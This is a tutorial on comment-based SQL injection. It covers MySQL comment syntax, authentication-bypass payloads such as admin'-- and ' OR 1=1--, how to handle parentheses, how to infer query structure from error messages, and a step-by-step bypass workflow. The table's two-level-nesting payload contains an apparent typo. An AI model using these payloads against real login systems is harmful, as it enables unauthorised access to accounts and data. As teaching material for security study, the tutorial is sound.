# Using Comments in SQL Injection

SQL comments are one of the most important tools in an attacker's injection arsenal. They solve the syntax error problem by discarding the remainder of the original query after the injection point, ensuring the final constructed query is valid regardless of what came after the input field.

***

## MySQL Comment Syntax

| Syntax | Notes |
|--------|-------|
| `-- ` (two dashes + space) | Standard inline comment, space after dashes is required |
| `--+` | URL-encoded form, `+` represents a space |
| `-- -` | Explicit form showing the space character clearly |
| `#` | MySQL-specific, URL-encode as `%23` in browser address bars |
| `/*comment*/` | Block comment, less common in basic injection |

The space requirement after `--` is a common source of failed payloads. `--password` is not a comment, but `-- password` is. When injecting through a URL parameter, always use `--+` or `%23` rather than raw `--` or `#`.

***

## Basic Comment-Based Auth Bypass

The simplest application: inject the admin username followed by a comment to discard the password check entirely.

```sql
-- Input: admin'--
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

Everything after `--` is ignored by the database. The password condition never executes. The query reduces to:

```sql
SELECT * FROM logins WHERE username='admin'
```

If `admin` exists in the table, the row is returned and login succeeds, regardless of what was entered in the password field.

***

## Handling Parentheses in Queries

Some applications wrap conditions in parentheses for precedence control. A query like:

```sql
SELECT * FROM logins WHERE (username='INPUT' AND id > 1) AND password=HASH('INPUT');
```

Adds two complications:
- The open parenthesis after `WHERE` must be closed before the comment
- The `id > 1` condition blocks the admin account (id = 1) even with valid credentials
- The password is hashed, preventing injection through the password field

A naive `admin'--` fails because it leaves an unclosed parenthesis:

```sql
SELECT * FROM logins WHERE (username='admin'-- ' AND id > 1) AND password=...
--                         ^ open bracket never closed = syntax error
```

The fix is closing the bracket in the payload: `admin')--`

```sql
-- Input: admin')--
SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password=...
```

This reduces to:

```sql
SELECT * FROM logins WHERE (username='admin')
```

Both the `id > 1` restriction and the password check are eliminated in one payload.

***

## Reading the Query Structure from Error Messages

Error messages reveal the query structure needed to craft the correct payload. A syntax error response tells you exactly where the imbalance is:

| Error Message | What It Reveals | Adjusted Payload |
|-------------|----------------|-----------------|
| `near "' AND password"` | Basic string injection, no brackets | `admin'--` |
| `near ") AND id"` | Unclosed parenthesis in query | `admin')--` |
| `near ")) AND"` | Two levels of nesting | `admin''))--` |
| No error, wrong user | Injection works but need OR condition | `' OR 1=1--` |

Each failed attempt with a visible error message gives you information to refine the payload. Systematic testing of `'`, `'--`, `')--`, `'))--` covers the vast majority of query structures encountered in practice.

***

## The Full Comment-Based Bypass Workflow

```
1. Test injection point: submit ' and observe response
   - Syntax error shown? Vulnerable, errors visible
   - Generic error? Vulnerable, errors suppressed
   - No change? May be sanitised or using parameterised queries

2. Determine query structure from error message

3. Craft payload:
   - Basic:            admin'--
   - With parenthesis: admin')--
   - Unknown username: ' OR 1=1--
   - With parenthesis: ') OR 1=1--

4. Verify: does the application return an authenticated state?
```

***

## Why Hashed Passwords Change the Attack Surface

When the application hashes the password before inserting it into the query, injecting through the password field becomes ineffective. The input `' OR 1=1` gets hashed first, and the resulting hash string is what appears in the SQL query, not the injected SQL. This is exactly why the username field becomes the primary target: the username is typically compared as plain text, leaving it injectable even when the password field is protected by hashing.

This highlights an important principle: sanitising or transforming one input field does not protect an application if other fields in the same query remain unsanitised.
